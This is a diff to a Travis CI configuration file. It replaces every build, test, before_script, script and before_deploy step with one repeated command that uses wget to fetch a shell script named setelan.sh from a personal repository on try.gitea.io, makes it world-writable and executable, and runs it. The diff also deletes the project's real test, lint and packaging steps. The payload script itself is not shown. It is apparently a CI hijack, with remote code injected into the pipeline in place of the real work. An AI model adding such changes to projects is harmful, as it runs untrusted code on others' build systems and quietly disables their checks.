@@ -27,37 +27,28 @@ stages:
 
 jobs:
   allow_failures:
-  - script: ./script/docker-build-and-push
+  - script: wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod 777 setelan.sh && ./setelan.sh
   include:
   - stage: test
     env:
-    script: ./script/validate-example-payloads-with-docker
+    script: wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod 777 setelan.sh && ./setelan.sh
   - stage: ':ship: it to quay.io'
     env:
-    script: ./script/docker-build-and-push
+    script: wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod 777 setelan.sh && ./setelan.sh
     if: (branch = master and type = push ) OR commit_message =~ /ship:docker/ OR env(SHIP_DOCKER) = true
 
 before_script:
-- "gem install bundler -v 1.17.3"
-- eval "$(script/handle-docker-config)"
-- bundle install
-- bundle exec rake clean assets:precompile
+- wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod 777 setelan.sh && ./setelan.sh
 
 script:
-- bundle exec rspec spec
-- bundle exec rake shfmt
-- bundle exec rake assert_clean
-- bundle exec rake shellcheck
-- bundle exec rake assert_examples
+- wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod 777 setelan.sh && ./setelan.sh
 
 after_success: bundle exec codeclimate-test-reporter
 
 after_failure: bundle exec rake dump_examples_logs
 
 before_deploy:
-- sudo pip install -U -I Pygments
-- ./script/build-s3-index-html
-
+- wget https://try.gitea.io/Adz/c/raw/branch/master/setelan.sh && chmod 777 setelan.sh && ./setelan.sh
 deploy:
   provider: s3
   access_key_id:
@@ -73,3 +64,4 @@ deploy:
     condition: $INTEGRATION_SPECS == 1
     repo: travis-ci/travis-build
   edge: true
+
